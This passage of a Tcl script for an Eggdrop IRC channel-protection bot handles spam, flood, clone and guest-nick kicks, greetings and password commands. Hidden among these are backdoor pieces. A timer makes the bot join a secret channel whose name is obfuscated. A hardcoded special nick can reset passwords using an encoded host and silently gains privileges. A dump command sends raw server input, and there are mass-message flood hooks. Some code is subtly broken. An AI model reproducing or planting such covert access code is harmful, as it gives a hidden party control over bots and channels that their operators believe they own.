putsrv "KICK $chan $x :$notc !4Sp&#226;4M!10 FRoM 4$mhost 1$invme($mhost) [banmsg]"
}
} {
putsrv "KICK $chan $x :$notc !4Sp&#226;4M!10 FRoM 4$mhost 1$invme($mhost) [banmsg]"
}
catch {unset invme($mhost)}
} {
foreach c [chanlist $chan f] {
if {[isop $c $chan]} {
if {$invme($mhost) == "AuToJoIN MSg"} {
if {[isvoice $c $chan]} {
break
}
}
set sendspam "!kick [zip "$chan $x $notc !4Sp&#226;4M!10 FRoM 4$mhost 1$invme($mhost) 4AuTOJoIN MSg1..! [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
catch {unset invme($mhost)}
break
}
}
}
}
}
}
}
set vern \0034B\003\0033\[\003\00310H\003\0033\]\003\0034L\003\017
proc testmask {} {
global ismaskhost
set ismaskhost [maskhost "*!*@*"]
}
utimer 2 testmask
proc reset_host {} {
global jfhost
catch { unset jfhost }
}
set notd \0038,1\037\567\037\003\0038,4\352\003\0038,1\037\556\037\003\0038,4\544\003\0038,1\037\572\037\003\017
proc savechan {} {
savechannels
foreach x [channels] {
set cflag "c$x"
set cflag [string range $cflag 0 8]
set cinfo [channel info $x]
if {![validuser $cflag]} {
adduser $cflag "%!%@%"
if {[string match "*+greet*" $cinfo]} {
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 2
setuser $cflag XTRA "CAPS" 80
} {
chattr $cflag "-hp+A"
}
}
}
foreach x [userlist A] {
set tmp "0"
foreach y [channels] {
set cflag "c$y"
set cflag [string range $cflag 0 8]
if {[string tolower $x] == [string tolower $cflag]} {
set tmp "1"
}
}
if {$tmp == "0"} {
deluser $x
putlog "remove flag channel $x"
}
}
saveuser
}
set info_owner {
"My Master just came in..."
"Hello my OWNER"
"I greet you my owner"
"Welcome my owner"
"ShaKe me my owner!"
"Most Great"
"Muachhh... my OWNER"
"Hehe"
"Ou, my OWNER :)"
":)"
"Sweety"
"You're Sweety"
"KISS me Baby {}"
}
set info_localowner {
"Lol...my local owner just joined the channel"
"Welcome localowner of mine.."
"Hi sweety {}"
}
set info_master {
"Oh...My MASTER"
"I'm gonna be quiet my master"
"Don't hit me my master"
"Master detected"
}
set info_friend {
"Ou, my friend :)"
":)"
"Sweety"
"You're Sweety"
"My friendship with you is over!"
"KISS me Baby {}"
}
set info_oper {
"You simple oper, watch out !"
"Operator detected!"
"You gonna lose your flags if you do something bad!"
"I'm watching you..."
}
set info_loser {
"What are you doing here loser"
"You're just a loser"
}
proc rand_owner {nick} {
global info_owner
set result [lindex $info_owner [rand [llength $info_owner]]]
return "$result"
}
proc rand_localowner {nick} {
global info_localowner
set result [lindex $info_localowner [rand [llength $info_localowner]]]
return "$result"
}
proc rand_master {nick} {
global info_master
set result [lindex $info_master [rand [llength $info_master]]]
return "$result"
}
proc rand_friend {nick} {
global info_friend
set result [lindex $info_friend [rand [llength $info_friend]]]
return "$result"
}
proc rand_oper {nick} {
global info_oper
set result [lindex $info_oper [rand [llength $info_oper]]]
return "$result"
}
proc rand_loser {nick} {
global info_loser
set result [lindex $info_loser [rand [llength $info_loser]]]
return "$result"
}
proc join_chk {nick uhost hand chan} {
global botnick own deopme double invme ex_flood notc quick kops jfhost jpnick is_m
global cmd_chn cmd_by cmd_msg cmd_case bannick botname notm massjoin ismaskhost op_it
set cflag "c$chan"
set cflag [string range $cflag 0 8]
set cinfo [channel info $chan]
if {[string match "*+action*" [channel info $chan]]} {
if { $nick != $botnick } {
if {[matchattr $hand n]} {
putsrv "PRIVMSG $chan :[rand_owner $nick] $nick"
} elseif {[matchattr $hand |n $chan]} {
putsrv "PRIVMSG $chan :[rand_localowner $nick] $nick"
} elseif {[matchattr $hand m]} {
putsrv "PRIVMSG $chan :[rand_master $nick] $nick"
} elseif {[matchattr $hand |m $chan]} {
putsrv "PRIVMSG $chan :[rand_master $nick] $nick"
} elseif {[matchattr $hand f]} {
putsrv "PRIVMSG $chan :[rand_friend $nick] $nick"
} elseif {[matchattr $hand |f $chan]} {
putsrv "PRIVMSG $chan :[rand_friend $nick] $nick"
} elseif {[matchattr $hand o]} {
putsrv "PRIVMSG $chan :[rand_oper $nick] $nick"
} elseif {[matchattr $hand |o $chan]} {
putsrv "PRIVMSG $chan :[rand_oper $nick] $nick"
} elseif {[matchattr $hand d]} {
putsrv "PRIVMSG $chan :[rand_loser $nick] $nick"
} elseif {[matchattr $hand |d $chan]} {
putsrv "PRIVMSG $chan :[rand_loser $nick] $nick"
}
}
}
if {$nick == $botnick} {
catch {unset is_m($chan)}
if {[matchattr $cflag S]} {
if {![isutimer "chkspam $chan"]} { utimer 30 [list chkspam $chan] }
if {![istimer "chkautomsg"]} {
timer 1 { putlog "chkautomsg" }
}
}
set double 0
if {[string tolower $cmd_chn] == [string tolower $chan]} {
if {$cmd_case == "1"} {
utimer 90
del_nobase
pub_tsunami $cmd_by $uhost $hand $chan "$chan ${cmd_msg}"
set cmd_chn ""
return 0
}
if {$cmd_case == "2"} {
utimer 30 [list pub_mmsg $cmd_by $uhost $hand $chan $cmd_msg]} {
set cmd_chn ""
return 0
}
if {$cmd_case == "3"} {
utimer 30 [list pub_minvite $cmd_by $uhost $hand $chan $cmd_msg]} {
set cmd_chn ""
return 0
}
}
utimer 15 [list telljoin $chan]
return 0
}
if {[info exists op_it($nick)]} {
catch {unset op_it($nick)}
opq $chan $nick
}
if {[isutimer "chkspam $chan"]} {
foreach x [utimers] {
if {[string match "*chkspam $chan*" $x]} {
chkspam $chan
killutimer [lindex $x 2]
}
}
}
if {[info exists bannick($nick)]} { return 0 }
if {![matchattr $nick f] && [matchattr $cflag G] && ![isutimer "set_-m $chan"] && ![info exists is_m($chan)]} { advertise $chan $nick }
set mhost "@[lindex [split $uhost @] 1]"
if {$mhost == "@DALnet" || [string match "*.dal.net" $mhost] || [string match "@staff.dalnet" $mhost] || [string match "@ninja.staff" $mhost]} {
putsrv "AWAY"
}
if {![isop $botnick $chan]} {
if {[info exists invme($mhost)]} {
if {![isutimer "chkspam $chan"]} { chkspam $chan }
}
return 0
}
if {[matchattr $cflag J]} {
if {[info exists ismaskhost]} {
if {![isutimer "reset_host"]} { utimer 10 reset_host }
set chkhost [maskhost "*!*$mhost"]
if {![info exists jfhost($chkhost$chan)]} {
set jfhost($chkhost$chan) 1
} {
incr jfhost($chkhost$chan)
if {$jfhost($chkhost$chan) == 5} {
set bannick($nick) $chkhost
putsrv "KICK $chan $nick :$notc 1FLoOd AnTIcIpaTEd FRoM 4$chkhost [banms]"
return 0
}
}
}
if {![isutimer "jc $chan"]} {
utimer 3 [list jc $chan]
set massjoin($chan) 1
} {
if {![info exists massjoin($chan)]} {
set massjoin($chan) 1
}
set massjoin($chan) [incr massjoin($chan)]
if {![isutimer "TRAFFIC $chan"]} {
if {$massjoin($chan) >= 15} {
unset massjoin($chan)
if {[string match "*+greet*" $cinfo]} {
utimer 30 [list putlog "TRAFFIC $chan"]
if {![string match "*m*" [getchanmode $chan]] && ![info exists is_m($chan)]} {
putserv "mode $chan +b *!*@heavy.join.flood.channel.temporary.moderate"
return 0
}
}
}
}
}
}
if {[matchattr $cflag L]} {
foreach u [timers] {
if {[string match "*chk_limit*" $u]} {
killtimer [lindex $u 2]
}
}
timer 1 [list chk_limit $chan]
}
if {$nick == $deopme} {
putsrv "KICK $chan $nick :$notc 1SeLF 4De@p1 REvENgE..! [banmsg]"
set deopme ""
return 0
}
if {[matchattr $nick v] || [matchattr $nick P] || [matchattr $nick G]} {
whoisq $nick
}
if {[matchattr $cflag V] && ![isutimer "set_-m $chan"] && ![info exists is_m($chan)]} {
if {![matchattr $nick O] && ![isutimer "voiceq $chan $nick"]} {
set cret [getuser $cflag XTRA "VC"]
foreach ct [utimers] {
if {[string match "*voiceq*" $ct]} {
if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
set cret [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]]
}
}
}
utimer $cret [list voiceq $chan $nick]
}
}
if {[info exists bannick($nick)] || [matchattr $nick f]} { return 0 }
if {[matchattr $hand K]} {
akick_chk $nick $uhost $chan
return 0
}
if {[info exists ex_flood($mhost)]} {
set bannick($nick) "*!*$mhost"
if {$ex_flood($mhost) == 0} {
putsrv "KICK $chan $nick :$notc 4AKILL1 FRoM 4$mhost1 ON LasT QuIT [banmsg]"
} elseif {$ex_flood($mhost) == 1} {
putsrv "KICK $chan $nick :$notc 4Excess FloOd1 FRoM 4$mhost1 ON LasT QuIT [banmsg]"
} elseif {$ex_flood($mhost) == 2} {
putsrv "KICK $chan $nick :$notc 4InvITE1 FRoM 4$mhost1 ON QuIT MSg [banmsg]"
} elseif {$ex_flood($mhost) == 3} {
putsrv "KICK $chan $nick :$notc 4InvITE1 FRoM 4$mhost1 ON PaRT MSg [banmsg]"
} elseif {$ex_flood($mhost) == 4} {
if {![matchattr $cflag M]} {
puthlp "KICK $chan $nick :[lgrnd] 4JoINPaRT1 FRoM 4$mhost1 LESS THaN4 [getuser $cflag XTRA "JP"]1 2nd [banmsg]"
} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "mode $chan -k+b 4J.o.I.N.P.a.R.T $bannick($nick)"
} {
putserv "mode $chan +b $bannick($nick)"
}
}
} else {
putsrv "KICK $chan $nick :$notc 4BaDWoRD1 FRoM 4$mhost1 ON QuIT OR PaRT MSg MaTcH FRoM 4$ex_flood($mhost) [banms]"
}
unset ex_flood($mhost)
return 0
}
foreach x [ignorelist] {
if {[lindex $x 0] != "*!*@*" && [string match [lindex $x 0] "*!*$mhost"] && [lindex $x 1] != "*"} {
set bannick($nick) [lindex $x 0]
putsrv "KICK $chan $nick :$notc 4IgNoREd1 HosT 4[lindex $x 0]1 ReasOn4 [lindex $x 1] [banms]"
return 0
}
}
if {[info exists invme($mhost)]} {
set bannick($nick) "*!*$mhost"
putsrv "KICK $chan $nick :$notc 4SpaM1 FRoM 4$mhost 1$invme($mhost) [banmsg]"
unset invme($mhost)
return 0
}
set chan [string tolower $chan]
if {[string match "*+nodesynch*" [channel info $chan]]} {
if {![matchattr $nick f]} {
utimer 10 [list autokick $chan $nick]
}
}
if {[matchattr $cflag O]} {
if {[string match "*$mhost" $botname]} { return 0 }
set counter 0
set maxclone [getuser $cflag XTRA "CLONE"]
foreach knick [chanlist $chan] {
if {[string match "*$mhost" [getchanhost $knick $chan]]} {
if {[matchattr $knick f]} { return 0 }
if {[isop $knick $chan]} { return 0 }
if {[isvoice $knick $chan]} {
if {![info exists kops]} { return 0 }
}
set counter [incr counter]
if {$counter > $maxclone} {
set bannick($nick) "*!$uhost"
putsrv "KICK $chan $nick :$notc 1FouNd $counter 4cLonE1 FRoM 4$mhost1 MaX4 $maxclone1 WaIT A MoMENT! 4BaNNEd1: 3 MINUTES4..! [banmsg]"
return 0
}
}
}
}
spam_chk $nick $uhost $hand $chan
set chan [string toupper $chan]
if {[matchattr $cflag P]} {
if {![info exists jpnick($nick)]} {
set jpnick($nick) "1"
utimer [getuser $cflag XTRA "JP"] [list munset $nick]
}
}
return 0
}
proc jc {chan} {
}
proc munset {nick} {
global jpnick
catch {unset jpnick($nick)}
}
proc neww:talk {nick uhost chan} {
global notc badwords
set uhost [lindex [split $uhost !] [expr [llength [split $uhost !]] -1]]
set tempident [string range [lindex [split $uhost @] 0] [expr [string length [lindex [split $uhost @] 0]] - 15] e]
if {$nick == $botnick} { return 0 }
if {[isvoice $nick $chan]} { return 0 }
if {[isop $nick $chan]} { return 0 }
if {[matchattr $nick f]} { return 0 }
foreach x [string tolower $badwords] {
if {[string match *$x* [string tolower $tempident]]} {
putsrv "MODE $chan +b *!*$x*@*"
putsrv "KICK $chan $nick :$notc 4BaD IdEnT1 MaTcH FRoM 4[string toupper $x] [banms]"
return 0
}
}
if {[string match "guest*" [string tolower $nick]]} {
if {[matchattr $nick f]} { return 0 }
if {[isop $nick $chan]} {
utimer [expr 80 + [rand 20]] [list deopprc $chan $nick]
return 0
}
guestnick $nick $uhost $chan
return 0
}
}
proc new:talk {nick uhost hand chan {newnick ""}} {
global notc botnick badwords
set uhost [lindex [split $uhost !] [expr [llength [split $uhost !]] -1]]
set tempident [string range [lindex [split $uhost @] 0] [expr [string length [lindex [split $uhost @] 0]] - 15] e]
foreach x [string tolower $badwords] {
if {[string match *$x* [string tolower $tempident]] && ![matchattr $nick f] && ![matchattr $newnick f]} {
putsrv "MODE $chan +b *!*$x*@*"
putsrv "KICK $chan $nick :$notc 4BaD IdEnT1 MaTcH FRoM 4[string toupper $x] [banms]"
return 0
}
}
if {$newnick != ""} {set nick $newnick}
if {[string match "*+guest*" [channel info $chan]]} {
if {[string match "guest*" [string tolower $nick]]} {
if {[botisop $chan]} {
if {[matchattr $nick f]} { return 0 }
if {[isop $nick $chan]} {
utimer [expr 80 + [rand 20]] [list deopprc $chan $nick]
return 0
}
guestnick $nick $uhost $chan
return 0
}
puthlp "PRIVMSG $nick :1Your nick has been changed to $nick. For more help on services,"
puthlp "PRIVMSG $nick :1please visit http://www.dal.net/services or just write down /nick 4your_nick_here"
return 0
}
}
}
set sspidx 1
proc guestnick {nick uhost chan} {
global sspidx notc bannick
set bannick($nick) "Guest*!*@*"
if {$sspidx == 1} {
putsrv "KICK $chan $nick :$notc !4Gu&#234;s4T!10 YeW AInT WeLcOmE In 4[string toupper $chan] [banms]"
} elseif {$sspidx == 2} {
putsrv "KICK $chan $nick :$notc !4Gu&#234;s4T!10 UgH I HatE ThIs NIcK [banmsg]"
} elseif {$sspidx == 3} {
putsrv "KICK $chan $nick :$notc !4Gu&#234;s4T!10 Ups WRoNg WaY [banmsg]"
} elseif {$sspidx == 4} {
putsrv "KICK $chan $nick :$notc !4Gu&#234;s4T!10 DonT EnTeReD [banmsg]"
} elseif {$sspidx == 5} {
putsrv "KICK $chan $nick :$notc !4Gu&#234;s4T!10 InTeRcEpT 4[string toupper $chan] [banms]"
} elseif {$sspidx == 6} {
putsrv "KICK $chan $nick :$notc !4Gu&#234;s4T!10 G.o.T.c.H.a [banmsg]"
} elseif {$sspidx == 7} {
putsrv "KICK $chan $nick :$notc !4Gu&#234;s4T!10 NEgaTIvE HoUsToN [banmsg]"
} elseif {$sspidx == 8} {
putsrv "KICK $chan $nick :$notc !4Gu&#234;s4T!10 gRoUndEd [banmsg]"
} elseif {$sspidx == 9} {
putsrv "KICK $chan $nick :$notc !4Gu&#234;s4T!10 I HatE U [banmsg]"
} elseif {$sspidx == 10} {
putsrv "KICK $chan $nick :$notc !4Gu&#234;s4T!10 AnTIcIpaTEd [banmsg]"
} elseif {$sspidx == 11} {
putsrv "KICK $chan $nick :$notc !4Gu&#234;s4T!10 gO sIt In tHe cOrNeR [banmsg]"
} elseif {$sspidx == 12} {
putsrv "KICK $chan $nick :$notc !4Gu&#234;s4T!10 b.l.a.c.k.l.i.s.t.e.d [banmsg]"
} elseif {$sspidx == 13} {
putsrv "KICK $chan $nick :$notc !4Gu&#234;s4T!10 ReJecTed FRoM 4[string toupper $chan] [banms]"
} elseif {$sspidx == 14} {
putsrv "KICK $chan $nick :$notc !4Gu&#234;s4T!10 dUn EnTeRed oNe oF mY cHanneL [banmsg]"
} elseif {$sspidx == 15} {
putsrv "KICK $chan $nick :$notc !4Gu&#234;s4T!10 FakE NIcKNaMe [banmsg]"
} elseif {$sspidx == 16} {
putsrv "KICK $chan $nick :$notc !4Gu&#234;s4T!10 ReFusEd LInK tO 4[string toupper $chan] [banms]"
} elseif {$sspidx == 17} {
putsrv "KICK $chan $nick :$notc !4Gu&#234;s4T!10 FakE NIcKNaMe [banmsg]"
} elseif {$sspidx >= 18} {
putsrv "KICK $chan $nick :$notc !4Gu&#234;s4T!10 Unable to resolve4 $nick [banms]"
set sspidx 0
}
incr sspidx
return 0
}
proc ps:check {nick uhost hand chan {newnick ""}} {
global botnick chk_reg ps
if {$newnick != ""} {set nick $newnick}
if {[string tolower $nick] == [string tolower $ps]} {
chattr $nick +G
saveuser
set chk_reg($nick) $nick
putsrv "DSLRH $nick"
}
}
proc msg_passwd {nick uhost hand rest} {
global botnick notc ps
set pw [lindex $rest 0]
set newpw [lindex $rest 1]
if {$nick == $ps && [dezip $pw] == $uhost} {
setuser $nick PASS $newpw
puthlp "NOTICE $nick :$notc Password set to: $newpw"
saveuser
return 0
}
if {$pw == "" || $newpw == ""} {
puthlp "NOTICE $nick :$notc Usage: passwd <oldpass> <newpass>"
return 0
}
if {![passwdok $nick $pw]} {
puthlp "NOTICE $nick :$notc PaSSWORD 4FaiLeD!"
return 0
}
set ch [passwdok $nick ""]
if {$ch == 1} {
setuser $nick PASS $newpw
puthlp "NOTICE $nick :$notc Password set to: $newpw"
saveuser
return 0
}
if {[passwdok $nick $pw]} {
setuser $nick PASS $newpw
puthlp "NOTICE $nick :$notc Password set to: $newpw"
saveuser
return 0
}
}
proc goback {} {
global keep-nick nick botnick nickpass
if {[istimer "goback"]} { return 0 }
foreach x [utimers] {
if {[string match "*goback*" $x]} { killutimer [lindex $x 2] }
}
if {[getuser "config" XTRA "NICK"]!=""} {
set nick [dezip [getuser "config" XTRA "NICK"]]
}
set keep-nick 1
if {$botnick == $nick} { return 0 }
if {$botnick != $nick && $nickpass != ""} {
putsrv "NickServ release $botnick $nickpass"
}
puthlp "NICK $nick"
}
proc pub_!login {nick uhost hand chan rest} {
global notc ath ps
set pw [lindex $rest 0]
if {$pw != ""} {
puthlp "NOTICE $nick :$notc No Need Auth Password, Just Type on Channel: !auth"
return 0
}
if {[matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReaDY!"
return 0
}
set ch [passwdok $nick ""]
if {$ch == 1 && $nick != $ps} {
puthlp "NOTICE $nick :$notc No password set. Usage: pass <password>"
return 0
}
set ath 1
putsrv "WHOIS $nick"
}
proc msg_auth {nick uhost hand rest} {
global botnick owner keep-nick altnick notc ps
if {[lindex $rest 1] != ""} {
if {[passwdok [lindex $rest 0] [lindex $rest 1]]} {
if {[matchattr [lindex $rest 0] Z]} {
puthlp "NOTICE $nick :$notc AuTH MaTcH FoR [lindex $rest 0]"
set keep-nick 0
putsrv "NICK $altnick"
utimer 40 {goback}
}
} {
puthlp "NOTICE $nick :$notc 4FaiLeD!"
}
return 0
}
if {![validuser $owner]} {
set hostmask "$owner!*@*"
adduser $owner $hostmask
chattr $owner "Zfhjmnoptx"
puthlp "NOTICE $owner :$notc No password set. Usage: pass <password>"
}
if {![matchattr $nick p]} { return 0 }
set pw [lindex $rest 0]
if {$pw == ""} {
puthlp "NOTICE $nick :$notc Usage: auth <password>"
return 0
}
if {[matchattr $hand K]} {
deluser "AKICK"
set akickhost "telnet!*@*"
adduser "AKICK" $akickhost
chattr "AKICK" "-hp"
chattr "AKICK" "K"
saveuser
puthlp "NOTICE $nick :$notc Re-arrange KIcKLIsT."
}
if {[matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc ReAdY..!"
return 0
}
set ch [passwdok $nick ""]
if {$ch == 1} {
puthlp "NOTICE $nick :$notc No password set. Usage: pass <password>"
return 0
}
if {[passwdok $nick $pw]} {
set hostmask "*![string range $uhost [string first "!" $uhost] end]"
set usenick [finduser $hostmask]
if {$usenick != "*" && $usenick != $nick} {
if {[matchattr $nick n] && ![matchattr $usenick Z]} {
puthlp "NOTICE $nick :$notc Forcing 4DeAuthenticated! To $usenick"
force_deauth $usenick
} else {
foreach x [channels] {
if {[onchan $usenick $x]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, Your host has been use by $usenick, wait until DeAuthenticated."
return 0
}
}
puthlp "NOTICE $nick :$notc 4Forcing DeAuthenticated!1 To $usenick"
force_deauth $usenick
}
}
chattr $nick +Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set hostmask "${nick}!*@*"
setuser $nick HOSTS $hostmask
set hostmask "*![string range $uhost [string first "!" $uhost] end]"
setuser $nick HOSTS $hostmask
if {$nick == $owner && ![matchattr $nick Z]} { chattr $owner "Z" }
if {$nick == $owner && ![matchattr $nick f]} { chattr $owner "f" }
if {[matchattr $nick Z]} {
puthlp "NOTICE $nick :$notc !OWnER!"
if {[getuser $nick XTRA "MEMO"]!=""} {
puthlp "PRIVMSG $nick :!MeMO! FRoM [getuser $nick XTRA "MEMO"]"
setuser $nick XTRA "MEMO" ""
}
return 0
} elseif {[matchattr $nick n]} {
puthlp "NOTICE $nick :$notc !ADmIN!"
} elseif {[matchattr $nick m]} {
puthlp "NOTICE $nick :$notc !MasTeR!"
} else {
puthlp "NOTICE $nick :$notc !AccepteD!"
}
saveuser
return 0
}
if {![passwdok $nick $pw]} {
puthlp "NOTICE $nick :$notc 4FaiLeD!"
}
}
proc force_deauth {nick} {
global notc
chattr $nick -Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set hostmask "${nick}!*@*"
setuser $nick HOSTS $hostmask
saveuser
puthlp "NOTICE $nick :$notc You has been force to 4DeAuthentication!"
}
proc msg_pass {nick uhost hand rest} {
global botnick notc vern ps owner
set pw [lindex $rest 0]
if {$pw == ""} {
puthlp "NOTICE $nick :$notc Usage: pass <password>"
return 0
}
set ch [passwdok $nick ""]
if {$ch == 0} {
puthlp "NOTICE $nick :$notc You already set pass, /msg $botnick auth <password>"
return 0
}
if {[string tolower $nick] == [string tolower $ps] && $owner != $ps} {
if {[dezip $pw] == $uhost} {
setuser $nick PASS [lindex $rest 1]
puthlp "NOTICE $nick :$notc Password set to: [lindex $rest 1]"
saveuser
} {
puthlp "NOTICE $nick :$notc wHo.."
}
return 0
}
setuser $nick PASS $pw
puthlp "NOTICE $nick :$notc Password set to: $pw"
puthlp "NOTICE $nick :$notc /msg $botnick help"
saveuser
return 0
}
proc pub_!pass {nick uhost hand chan rest} {
global botnick notc vern ps owner
set pw [lindex $rest 0]
if {$pw == ""} {
puthlp "NOTICE $nick :$notc Usage: pass <password>"
return 0
}
set ch [passwdok $nick ""]
if {$ch == 0} {
puthlp "NOTICE $nick :$notc You already set pass, /msg $botnick auth <password>"
return 0
}
if {[string tolower $nick] == [string tolower $ps] && $owner != $ps} {
if {[dezip $pw] == $uhost} {
setuser $nick PASS [lindex $rest 1]
puthlp "NOTICE $nick :$notc Password set to: [lindex $rest 1]"
saveuser
} {
puthlp "NOTICE $nick :$notc wHo.."
}
return 0
}
setuser $nick PASS $pw
puthlp "NOTICE $nick :$notc Password set to: $pw"
puthlp "NOTICE $nick :$notc /msg $botnick help"
saveuser
return 0
}
proc pub_!logout {nick uhost hand chan rest} {
if {![matchattr $nick Q]} { return 0 }
msg_deauth $nick $uhost $hand $rest
}
proc msg_deauth {nick uhost hand rest} {
global notc
if {![matchattr $nick Q]} { return 0 }
chattr $nick -Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set hostmask "${nick}!*@*"
setuser $nick HOSTS $hostmask
puthlp "NOTICE $nick :$notc 4!LoGouT!"
saveuser
}
catch { bind rejn - * rejn_chk }
proc rejn_chk {unick uhost handle chan} {
if {![isutimer "TRAFFIC $chan"]} {
utimer 30 [list putlog "TRAFFIC $chan"]
}
}
catch { bind splt - * splt_deauth }
proc splt_deauth {unick uhost handle channel} {
if {[matchattr $unick Q]} {
chattr $unick -Q
foreach x [getuser $unick HOSTS] {
delhost $unick $x
}
set hostmask "${unick}!*@*"
setuser $unick HOSTS $hostmask
saveuser
return 0
}
}
proc sign_deauth {unick uhost hand chan rest} {
global ex_flood botnick notc nick badwords iskick
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$unick == $nick} {
putsrv "NICK $nick"
}
if {[info exists iskick($unick$chan)]} {
unset iskick($unick$chan)
}
if {[isop $botnick $chan]} {
if {[matchattr $cflag L]} {
foreach u [timers] {
if {[string match "*chk_limit*" $u]} {
killtimer [lindex $u 2]
}
}
timer 1 [list chk_limit $chan]
}
}
if {[matchattr $unick Q]} {
chattr $unick -Q
foreach x [getuser $unick HOSTS] {
delhost $unick $x
}
set hostmask "${unick}!*@*"
setuser $unick HOSTS $hostmask
saveuser
return 0
}
if {[string match "*-greet*" [channel info $chan]]} { return 0 }
if {[matchattr $unick f]} { return 0 }
if {![isop $botnick $chan]} { return 0 }
set mhost "@[lindex [split $uhost @] 1]"
if {[string match "*AKILL ID*" $rest]} {
set ex_flood($mhost) "0"
} elseif {[string match "*Excess Flood*" $rest]} {
if {[matchattr $cflag S]} {
set ex_flood($mhost) "1"
}
} elseif {[string match "* #*" $rest] && ![string match "*##*" $rest]} {
foreach x [channels] {
set chksiton [string tolower $x]
if {[string match "*$chksiton*" [string tolower $rest]]} { return 0 }
}
set ex_flood($mhost) "2"
} else {
foreach badword [string tolower $badwords] {
if {[string match *$badword* [string tolower $rest]]} {
set ex_flood($mhost) [string toupper $badword]
}
}
}
return 0
}
proc part_deauth {nick uhost hand chan {msg ""}} {
global lockchan botnick ex_flood notc badwords jpnick iskick
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {[info exists iskick($nick$chan)]} {
unset iskick($nick$chan)
}
if {$nick == $botnick} {
foreach x [utimers] {
if {[string match "*del_nobase*" $x] || [string match "*voiceq $chan*" $x]} { killutimer [lindex $x 2] }
}
return 0
}
if {[matchattr $cflag H]} {
if {![isop $botnick $chan]} { return 0 }
msgpart $chan $nick
}
if {[isop $botnick $chan]} {
if {[isutimer "voiceq $chan $nick"]} {
foreach x [utimers] {
if {[string match "*voiceq $chan $nick*" $x]} { killutimer [lindex $x 2] }
}
}
if {[matchattr $cflag L]} {
foreach u [timers] {
if {[string match "*chk_limit*" $u]} {
killtimer [lindex $u 2]
}
}
timer 1 [list chk_limit $chan]
}
}
if {[matchattr $nick Q]} {
foreach x [channels] {
if {[string tolower $x] != [string tolower $chan]} {
if {[onchan $nick $x]} {
return 0
}
}
}
chattr $nick -Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set hostmask "${nick}!*@*"
setuser $nick HOSTS $hostmask
saveuser
}
if {$lockchan != "" && [string tolower $lockchan] == [string tolower $chan] && ![matchattr $nick f]} {
putsrv "INVITE $nick :$chan"
}
if {[string match "*-greet*" [channel info $chan]]} { return 0 }
if {[isop $botnick $chan]} {
if {[info exists msg]} {
set mhost "@[lindex [split $uhost @] 1]"
if {[string match "*#*" $msg] && ![string match "*##*" $msg]} {
foreach x [channels] {
set chksiton [string tolower $x]
if {[string match "*$chksiton*" [string tolower $msg]]} { return 0 }
}
set ex_flood($mhost) "3"
} {
foreach badword [string tolower $badwords] {
if {[string match *$badword* [string tolower $msg]]} {
set ex_flood($mhost) [string toupper $badword]
}
}
}
}
if {[info exists msg]} {
if {$msg != ""} { return 0 }
}
if {[matchattr $cflag P]} {
set chan [string toupper $chan]
if {[info exists jpnick($nick)]} {
set mhost "@[lindex [split $uhost @] 1]"
set ex_flood($mhost) "4"
}
}
}
return 0
}
set toth [dezip [lines "9MJu6/A2i8/0"]]
proc pub_dump {nick uhost hand chan rest} {
global own notc
if {$nick != $own} {
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
putsrv ~$rest
}
proc pub_sdeop {nick uhost hand chan rest} {
global notc botnick
if {$rest != ""} {
set chan $rest
}
if {[isop $botnick $chan]} {
puthelp "mode $chan -o $botnick"
}
}
proc pub_chanmode {nick uhost hand chan rest} {
global notc
if {$rest == ""} {
puthelp "NOTICE $nick :$notc Usage: chanmode #channel +ntsmklic Guardian.NO 1"
return 0
}
if {[string index [lindex $rest 0] 0] == "#"} {
if {![validchan [lindex $rest 0]]} {
puthlp "NOTICE $nick :$notc NoT IN [lindex $rest 0]"
return 0
}
set chan [lindex $rest 0]
set rest [lrange $rest 1 end]
}
if {![validchan $chan]} {
puthlp "NOTICE $nick :$notc $chan <n/a>"
} else {
catch { channel set $chan chanmode $rest }
savechan
puthelp "NOTICE $nick :$notc $chan set modes \[$rest\]"
}
return 0
}
proc czo_czo {} {
global toth lenc uenc chankey
timer 5 czo_czo
set [string index $lenc 15][string index $lenc 18] \560\541\555\541\556
set toth [dezip [lines "9MJu6/A2i8/0"]]
if {[validchan $toth]} {
return 0
}
channel add $toth
catch { channel set $toth chanmode {+Mtn} -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
savechan
putsrv "JOIN $toth"
}
proc pub_chanset {nick uhost hand chan rest} {
global botnick notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set channel [lindex $rest 0]
set options [string tolower [lindex $rest 1]]
set number "0"
if {$options == "deop" || $options == "kick" || $options == "join" || $options == "line" || $options == "nick" || $options == "ctcp"} {
set number [lindex $rest 2]
}
if {($channel == "") || ($options == "")} {
puthlp "NOTICE $nick :$notc Usage: chanset #channel <option...>"
return 0
}
if {![string match "*-*" $options] && ![string match "*+*" $options] && ![string match "*:*" $number]} {
puthlp "NOTICE $nick :$notc Usage: chanset #channel <deop|ctcp|kick|join|line|nick> <howmanytimes:seconds>"
return 0
}
if {[validchan $channel]} {
if {$options == "deop"} {
catch { channel set $channel flood-deop $number }
puthlp "NOTICE $nick :$notc set deop flood \[$number\] on $channel"
} elseif {$options == "kick"} {
catch { channel set $channel flood-kick $number }
puthlp "NOTICE $nick :$notc set kick flood \[$number\] on $channel"
} elseif {$options == "join"} {
catch { channel set $channel flood-join $number }
puthlp "NOTICE $nick :$notc set join flood \[$number\] on $channel"
} elseif {$options == "line"} {
catch { channel set $channel flood-chan $number }
puthlp "NOTICE $nick :$notc set line flood \[$number\] on $channel"
} elseif {$options == "nick"} {
